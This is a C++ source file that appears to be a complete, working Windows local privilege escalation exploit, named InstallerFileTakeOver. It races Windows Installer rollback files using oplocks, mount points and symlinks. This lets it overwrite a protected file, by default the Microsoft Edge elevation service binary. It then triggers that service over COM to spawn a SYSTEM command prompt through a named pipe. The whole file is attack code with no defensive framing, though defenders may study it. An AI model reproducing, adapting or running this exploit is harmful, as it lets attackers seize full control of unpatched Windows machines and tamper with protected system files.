// InstallerFileTakeOver.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <AclAPI.h>
#include <sddl.h>
#include <conio.h>
#include <strsafe.h>
#include <vector>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <comdef.h>
#pragma comment(lib, "shlwapi.lib")
#include "Win-Ops-Master.h"
#include "InstallerDispatcher.h"


OpsMaster op;
WCHAR GlobalInstallDir[MAX_PATH];
HANDLE GlobalNtpdHandle = NULL;
WCHAR global_fnr[MAX_PATH];
WCHAR global_rbf_full_path[MAX_PATH];
HANDLE global_fnr_handle = NULL;
WCHAR global_msft_plz[MAX_PATH];
HANDLE global_sm_link = NULL;
HANDLE hglobal_msft_plz = NULL;
HANDLE global_new_msft_plz = NULL;
HANDLE hspl = NULL;
HANDLE htoast = NULL;
bool OplockTrigger = false;
WCHAR global_temp[MAX_PATH];
WCHAR EdgeSvcPath[MAX_PATH];


WCHAR* _GetUserSid() {

    HANDLE hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    HANDLE htoken = NULL;
    OpenProcessToken(hprocess, TOKEN_ALL_ACCESS, &htoken);
    CloseHandle(hprocess);
    DWORD dwSize;
    GetTokenInformation(htoken, TokenUser, nullptr, 0, &dwSize);

    std::vector<BYTE> userbuffer(dwSize);

    GetTokenInformation(htoken, TokenUser, &userbuffer[0], dwSize, &dwSize);

    CloseHandle(htoken);

    PTOKEN_USER user = reinterpret_cast<PTOKEN_USER>(&userbuffer[0]);

    LPWSTR lpUser;
    if (ConvertSidToStringSid(user->User.Sid, &lpUser))
    {
        return lpUser;
    }
    return NULL;

}

bool ChangeProcessACL() {

    HANDLE hprocess = OpenProcess(READ_CONTROL | WRITE_DAC | WRITE_OWNER | PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());


    //WCHAR string_sd[] = L"D:(A;;0x1f1ffa;;;S-1-5-21-2698539051-1299007672-586681352-1001)(A;;0x1f1ffa;;;SY)\0";
    WCHAR string_sd[512] = L"D:(A;;0x1f1ffa;;;\0";
    StringCchCat(string_sd, 512, _GetUserSid());
    StringCchCat(string_sd, 512, L")(A;;0x1f1ffa;;;SY)\0");
    PSECURITY_DESCRIPTOR in_sd = new SECURITY_DESCRIPTOR;

    ULONG sd_sz = 0;
    ConvertStringSecurityDescriptorToSecurityDescriptor(string_sd, SDDL_REVISION_1, &in_sd, &sd_sz);

    PSECURITY_DESCRIPTOR out_sd = NULL;
    DWORD absolute_sd_sz = 0;
    PACL out_acl = 0;
    DWORD acl_sz = 0;
    PACL out_sacl = 0;
    DWORD sacl_sz = 0;
    DWORD owner_sz = 0;
    PSID out_owner_sid = 0;
    DWORD grp_sz = 0;
    PSID out_grp_sid = 0;
    MakeAbsoluteSD(in_sd, out_sd, &absolute_sd_sz, out_acl, &acl_sz, out_sacl, &sacl_sz,
        out_owner_sid, &owner_sz, out_grp_sid, &grp_sz);
    out_sd = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, absolute_sd_sz);
    out_acl = (PACL)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, acl_sz);
    out_sacl = (PACL)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, sacl_sz);
    out_owner_sid = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, owner_sz);
    out_grp_sid = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, grp_sz);

    MakeAbsoluteSD(in_sd, out_sd, &absolute_sd_sz, out_acl, &acl_sz, out_sacl, &sacl_sz,
        out_owner_sid, &owner_sz, out_grp_sid, &grp_sz);

    DWORD ret = SetSecurityInfo(hprocess, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, out_acl, NULL);
    HeapFree(GetProcessHeap(), NULL, out_sd);
    HeapFree(GetProcessHeap(), NULL, out_acl);
    HeapFree(GetProcessHeap(), NULL, out_sacl);
    HeapFree(GetProcessHeap(), NULL, out_owner_sid);
    HeapFree(GetProcessHeap(), NULL, out_grp_sid);
    CloseHandle(hprocess);
    return ret == ERROR_SUCCESS;
}

void DropFile(WCHAR* file) {
    HANDLE hf = op.OpenFileNative(std::wstring(file), GENERIC_READ | GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
    std::wstring smtg = op.GenerateRandomStr();
    op.WriteFileNative(hf, (PVOID)smtg.c_str(), smtg.size() * sizeof(WCHAR), NULL);
    CloseHandle(hf);
}
bool DoesEdgeSvcExist() {
    SC_HANDLE scmgr = OpenSCManagerW(NULL, NULL, GENERIC_READ);
    SC_HANDLE edge_svc = OpenServiceW(scmgr, L"MicrosoftEdgeElevationService", SERVICE_QUERY_CONFIG);
    bool res = GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST;
    CloseServiceHandle(scmgr);
    if (res)
        return false;
    CloseServiceHandle(edge_svc);
    return true;
}
void PrepareGlobalInstallDir() {
    WCHAR string_sd[512] = L"D:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;\0";
    StringCchCat(string_sd, 512, _GetUserSid());
    StringCchCat(string_sd, 512, L")(A;OICI;FA;;;BA)\0");
    PSECURITY_DESCRIPTOR sd = new SECURITY_DESCRIPTOR;
    ULONG sd_sz = 0;
    ConvertStringSecurityDescriptorToSecurityDescriptor(string_sd, SDDL_REVISION_1, &sd, &sd_sz);
    SECURITY_ATTRIBUTES sa = { sizeof(sa), sd, FALSE };
    WCHAR _tmp[MAX_PATH] = L"%TEMP%\\";
    StringCchCat(_tmp, MAX_PATH, op.GenerateRandomStr().c_str());
    ExpandEnvironmentStrings(_tmp, GlobalInstallDir, MAX_PATH);
    WCHAR ntpd[MAX_PATH];
    wcscpy_s(ntpd, GlobalInstallDir);
    SHCreateDirectoryEx(NULL, ntpd, &sa);
    StringCchCat(ntpd, MAX_PATH, L"\\microsoft plz");
    SHCreateDirectory(NULL, ntpd);
    StringCchCat(ntpd, MAX_PATH, L"\\notepad.exe");
    DropFile(ntpd);
    WCHAR spl[MAX_PATH];
    wcscpy_s(spl, GlobalInstallDir);
    StringCchCat(spl, MAX_PATH, L"\\splwow64.exe");
    DropFile(spl);
    WCHAR apptoast[MAX_PATH];
    wcscpy_s(apptoast, GlobalInstallDir);
    StringCchCat(apptoast, MAX_PATH, L"\\@AppHelpToast.png");
    DropFile(apptoast);

    wcscpy_s(global_temp, GlobalInstallDir);
    StringCchCat(global_temp, MAX_PATH, L"\\");
    StringCchCat(global_temp, MAX_PATH, op.GenerateRandomStr().c_str());
    CreateDirectory(global_temp, NULL);
    return;
}

void LockNotepadFile() {

    WCHAR ntpd[MAX_PATH];
    wcscpy_s(ntpd, GlobalInstallDir);
    StringCchCat(ntpd, MAX_PATH, L"\\microsoft plz\\notepad.exe");
    GlobalNtpdHandle = CreateFile(ntpd, GENERIC_READ | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    return;
}

WCHAR* GetRbfFile(HANDLE hdir) {

    FILE_NOTIFY_INFORMATION* fn;
    do {
        char buf[4096];
        DWORD ret_sz = 0;
        ReadDirectoryChangesW(hdir, buf, 4096, TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret_sz, NULL, NULL);
        fn = (FILE_NOTIFY_INFORMATION*)buf;
        if (fn->Action != FILE_ACTION_REMOVED)
            continue;
        size_t sz = fn->FileNameLength / sizeof(WCHAR);
        fn->FileName[sz] = '\0';
    } while (wcscmp(PathFindExtension(fn->FileName), L".rbf") != 0);
    return fn->FileName;
}
std::wstring _BuildNativePath(std::wstring path) {
    //I am considering any path that start with \ is a native path
    if (path.rfind(L"\\", 0) != std::wstring::npos)
        return path;
    path = L"\\??\\" + path;
    return path;
}
void cb_spl() {
    if (OplockTrigger)
        return;
    OplockTrigger = true;
    CloseHandle(htoast);
    WCHAR ss[MAX_PATH];
    wcscpy_s(ss, GlobalInstallDir);
    StringCchCat(ss, MAX_PATH, L"\\");
    StringCchCat(ss, MAX_PATH, op.GenerateRandomStr().c_str());
    global_new_msft_plz = op.OpenDirectory(ss, GENERIC_READ | GENERIC_WRITE | DELETE, ALL_SHARING, OPEN_ALWAYS);
    op.CreateMountPoint(global_new_msft_plz, L"\\BaseNamedObjects\\Restricted");
}
void cb_toast() {
    if (OplockTrigger)
        return;
    OplockTrigger = true;
    CloseHandle(hspl);
    WCHAR ss[MAX_PATH];
    wcscpy_s(ss, GlobalInstallDir);
    StringCchCat(ss, MAX_PATH, L"\\");
    StringCchCat(ss, MAX_PATH, op.GenerateRandomStr().c_str());
    global_new_msft_plz = op.OpenDirectory(ss, GENERIC_READ | GENERIC_WRITE | DELETE, ALL_SHARING, OPEN_ALWAYS);
    op.CreateMountPoint(global_new_msft_plz, L"\\BaseNamedObjects\\Restricted");
}
WCHAR* GetEdgeServicePath() {
    static bool z = true;
    if (z)
        z = false;
    else
        return EdgeSvcPath;
    if (!DoesEdgeSvcExist())
        return NULL;
    SC_HANDLE scmgr = OpenSCManagerW(NULL, NULL, GENERIC_READ);
    SC_HANDLE edge_svc = OpenServiceW(scmgr, L"MicrosoftEdgeElevationService", SERVICE_QUERY_CONFIG);
    CloseServiceHandle(scmgr);
    QUERY_SERVICE_CONFIG* svc_cfg = NULL;
    DWORD ndbytes = 0;
    QueryServiceConfigW(edge_svc, svc_cfg, NULL, &ndbytes);
    svc_cfg = (QUERY_SERVICE_CONFIG *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, ndbytes);
    QueryServiceConfigW(edge_svc, svc_cfg, ndbytes, &ndbytes);
    WCHAR binpath[MAX_PATH];
    wcscpy_s(binpath,MAX_PATH,svc_cfg->lpBinaryPathName);
    HeapFree(GetProcessHeap(), NULL, svc_cfg);
    CloseServiceHandle(edge_svc);
    int j = 1;
    for (int i = 0; i < lstrlenW(binpath) - 2; i++) {

        EdgeSvcPath[i] = binpath[j];
        EdgeSvcPath[i + 1] = L'\0';
        j++;
    }

    return EdgeSvcPath;
}
HANDLE CreateSMForRbf(WCHAR* sm) {

    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if (argc == 2) {
        return op.CreateNativeSymlink(std::wstring(sm), _BuildNativePath(argv[1]));
    }
    return op.CreateNativeSymlink(std::wstring(sm), _BuildNativePath(GetEdgeServicePath()));
}
void cb2() {
    CloseHandle(GlobalNtpdHandle);
    op.MoveFileToTempDir(global_fnr_handle,USE_CUSTOM_TEMP_DIR,std::wstring(global_temp));

    if (hglobal_msft_plz) {
        op.MoveFileToTempDir(hglobal_msft_plz, USE_CUSTOM_TEMP_DIR, std::wstring(global_temp));
        CloseHandle(hglobal_msft_plz);
    }
    op.MoveByHandle(global_new_msft_plz, std::wstring(global_msft_plz));
    CloseHandle(global_new_msft_plz);
    WCHAR sm[MAX_PATH];
    wcscpy_s(sm, L"\\BaseNamedObjects\\Restricted\\");
    StringCchCat(sm, MAX_PATH, global_fnr);

    global_sm_link = CreateSMForRbf(sm);
}

DWORD WINAPI exp(void*) {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    wcscpy_s(global_msft_plz, GlobalInstallDir);
    StringCchCat(global_msft_plz, MAX_PATH, L"\\microsoft plz");
    HANDLE hdir = CreateFile(global_msft_plz, GENERIC_READ, ALL_SHARING, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    WCHAR fst[MAX_PATH];
    wcscpy_s(fst, GetRbfFile(hdir));
    do {
        wcscpy_s(global_fnr, GetRbfFile(hdir));
    } while (wcscmp(fst, global_fnr) == 0);
    CloseHandle(hdir);
    HANDLE test;
    wcscpy_s(global_rbf_full_path, GlobalInstallDir);
    StringCchCat(global_rbf_full_path, MAX_PATH, L"\\microsoft plz\\");
    StringCchCat(global_rbf_full_path, MAX_PATH, global_fnr);
    do {
        test = op.OpenFileNative(global_rbf_full_path, GENERIC_READ, NULL, CREATE_NEW);
    } while (!test);
    CloseHandle(test);
    WCHAR spl[MAX_PATH];
    WCHAR toast[MAX_PATH];
    wcscpy_s(toast, GlobalInstallDir);
    wcscpy_s(spl, GlobalInstallDir);
    StringCchCat(toast, MAX_PATH, L"\\@AppHelpToast.png");
    StringCchCat(spl, MAX_PATH, L"\\splwow64.exe");

    hspl = op.OpenFileNative(spl, GENERIC_READ | GENERIC_WRITE, NULL, OPEN_ALWAYS);
    htoast = op.OpenFileNative(toast, GENERIC_READ | GENERIC_WRITE, NULL, OPEN_ALWAYS);
    hglobal_msft_plz = op.OpenDirectory(global_msft_plz, DELETE, ALL_SHARING, OPEN_EXISTING);
    lock_ptr lk_spl = op.CreateLock(hspl, cb_spl);
    lock_ptr lk_toast = op.CreateLock(htoast, cb_toast);
    while (!OplockTrigger) {  }// a pure waste of your precious cpu
    delete lk_spl;
    delete lk_toast;
    global_fnr_handle = op.OpenFileNative(global_rbf_full_path, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, OPEN_ALWAYS);
    op.CreateAndWaitLock(global_fnr_handle, cb2);
    return ERROR_SUCCESS;
}
class __declspec(uuid("4d40ca7e-d22e-4b06-abbc-4defecf695d8")) IFoo : public IUnknown {
public:
    virtual HRESULT __stdcall Method();
};
_COM_SMARTPTR_TYPEDEF(IFoo, __uuidof(IFoo));

void StartElevationSvc() {

    IFoo* pObject;
    struct __declspec(uuid("1FCBE96C-1697-43AF-9140-2897C7C69767")) CLSID_Object;
    CoInitialize(NULL);
    CoCreateInstance(__uuidof(CLSID_Object), NULL, CLSCTX_LOCAL_SERVER, __uuidof(IFoo), reinterpret_cast<void**>(&pObject));
    CoUninitialize();
    return;
}

bool IsService() {
    if (!DoesEdgeSvcExist())
        return false;
    WCHAR* svc_path = GetEdgeServicePath();
    WCHAR current_path[MAX_PATH];
    GetModuleFileName(GetModuleHandle(NULL), current_path, MAX_PATH);
    if (_wcsicmp(svc_path, current_path) != 0)
        return false;
    return true;
}
void LaunchBroker() {
    WCHAR current_path[MAX_PATH];
    GetModuleFileName(GetModuleHandle(NULL), current_path, MAX_PATH);
    WCHAR full_cmd[MAX_PATH] = L"\"";
    StringCchCat(full_cmd, MAX_PATH, current_path);
    StringCchCat(full_cmd, MAX_PATH, L"\" /svc");
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcess(current_path, full_cmd, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
    return;
}
bool IsBroker() {
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if (argc != 2)
        return false;
    if (_wcsicmp(argv[1], L"/svc") != 0)
        return false;
    return true;
}
int BrokerMain() {

    HANDLE hpipe = CreateNamedPipe(L"\\\\.\\pipe\\ExploitPipe", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_BYTE | PIPE_WAIT, 1, NULL, NULL, NULL, NULL);
    if (hpipe == INVALID_HANDLE_VALUE) {
        return 1;
    }
    ConnectNamedPipe(hpipe, NULL);
    ULONG sesid = 0;
    GetNamedPipeClientSessionId(hpipe, &sesid);
    CloseHandle(hpipe);
    HANDLE hcurrentprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE, FALSE, GetCurrentProcessId());
    HANDLE htoken = NULL;
    OpenProcessToken(hcurrentprocess, TOKEN_ALL_ACCESS, &htoken);
    CloseHandle(hcurrentprocess);
    HANDLE hduptoken = NULL;
    DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hduptoken);
    CloseHandle(htoken);
    SetTokenInformation(hduptoken, TokenSessionId, &sesid, sizeof(sesid));
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    si.wShowWindow = SW_SHOW;
    si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
    WCHAR comspec[MAX_PATH];
    ExpandEnvironmentStrings(L"%ComSpec%", comspec, MAX_PATH);
    CreateProcessAsUser(hduptoken, comspec, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    CloseHandle(hduptoken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
bool IsFileWriteAble(WCHAR* f) {

    HANDLE hg = op.OpenFileNative(f, GENERIC_WRITE, ALL_SHARING, OPEN_EXISTING);
    if (!hg)
        return false;
    CloseHandle(hg);
    return true;
}

int wmain(int argc, wchar_t *argv[])
{

    if (!DoesEdgeSvcExist() && (argc != 2)) {
        wprintf(L"[#] Usage : %s C:\\File\\To\\Take\\Over", argv[0]);
        return 0;
    }

    if (IsBroker()) {
        return BrokerMain();
    }
    if (IsService()) {
        LaunchBroker();
        return 0;
    }

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    ChangeProcessACL();
    PrepareGlobalInstallDir();
    InstallerDispatcher* dispatcher = new InstallerDispatcher;
    LockNotepadFile();
    DWORD tid = 0;
    HANDLE hexp = CreateThread(NULL, NULL, exp, NULL, NULL, &tid);
    dispatcher->RunAdminInstall(GlobalInstallDir);
    WaitForSingleObject(dispatcher->InstallerDispatcherThread, INFINITE);
    WaitForSingleObject(hexp, INFINITE);
    CloseHandle(hexp);
    CloseHandle(global_sm_link);
    delete dispatcher;
    if (argc != 1)
        return 0;
    if (!IsFileWriteAble(GetEdgeServicePath()))
        return 1;
    WCHAR current_path[MAX_PATH];
    GetModuleFileName(GetModuleHandle(NULL), current_path, MAX_PATH);
    CopyFile(current_path, GetEdgeServicePath(), FALSE);
    StartElevationSvc();
    HANDLE hpipe;
    do {
        Sleep(100);
        hpipe = CreateFile(L"\\\\.\\pipe\\ExploitPipe", GENERIC_READ, ALL_SHARING, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    } while (hpipe == INVALID_HANDLE_VALUE);
    CloseHandle(hpipe);

    return 0;
}

